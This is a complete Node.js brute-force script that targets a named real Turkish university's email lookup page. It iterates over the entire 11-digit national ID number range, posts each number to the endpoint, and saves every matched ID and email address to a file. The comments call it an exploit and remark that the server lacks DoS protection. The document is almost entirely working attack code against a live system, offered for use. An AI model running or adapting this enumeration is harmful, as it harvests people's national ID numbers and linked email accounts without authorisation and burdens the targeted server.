const axios = require('axios')
const fs = require('fs')

const DelayFor = 150
const URL = 'https://eposta.bandirma.edu.tr/EPostaOgren'
const LogFile = 'Founded.txt'
/*
 Output visualise
*/
const Color = {
  Reset: "\x1b[0m",
  FgRed: "\x1b[31m",
  FgGreen: "\x1b[32m",
  FgWhite: "\x1b[37m",
  FgYellow: "\x1b[33m",
}

/*
  i18n base
*/
Outputs = {
  TR : [
    "Testing for TC number",
    "Detected correct TC ID number:",
    "Bad TC ID numbers:",
    "Couldnt connect BANU servers!",
    "End of exploit process!"
  ]
}

/*
  Since the website software is amateur,
  I guess the server does not have dos protection
  and may try to interpret all requests.
  The server may not be able to respond to requests
  that are too fast. We don't want to crash the server.
*/
const Delay = function(ms) {
    return new Promise((res) => {
        setTimeout(res, ms)
    })
}

/*
  Saves found results to txt file
*/
const saveToFile = function(content) {
  fs.writeFile(LogFile, content, { flag: "a+" }, (err) => {
    if (err) throw err;
  });
}

/*
  Bad coding written quickly, can be done better.
  It makes inquiries from the server according to the given tc number.
*/
const getResult = async function(tcNumber) {
  console.log(Color.FgYellow, `${Outputs.TR[0]} ${tcNumber}`, Color.Reset)
  return new Promise((resum) => {
    axios
      .post(URL, {
        TCNo: tcNumber
      })
      .then(res => {
        if(res.data.match(/<b>(.*?)<\/b>/g)) {
          var result = res.data.match(/<b>(.*?)<\/b>/g).map(function(val){
             return val.replace(/<\/?b>/g,'');
          });
          console.log(Color.FgGreen,`${Outputs.TR[1]} ${tcNumber}, email: ${result[0]}`, Color.Reset), saveToFile(`TC: ${tcNumber} Email: ${result[0]}\n`)
        } else {
          console.log(Color.FgRed, `${Outputs.TR[2]} ${tcNumber}!`, Color.Reset)
        }
        // Resume to process
        resum()
      })
      .catch(error => {
        console.error(Color.FgRed,`${Outputs.TR[3]}`, Color.Reset)
      })
  })
}

/*
  Tries all TC ID numbers
*/
const bruteForce = async function() {
  // Clear logs
  fs.unlinkSync(LogFile)
  for (var i = 10000000000; i < 99999999999; i++) {
    await getResult(i)
    await Delay(DelayFor)
  }
  console.log(Color.FgYellow, Outputs.TR[4], Color.Reset);
}

bruteForce()
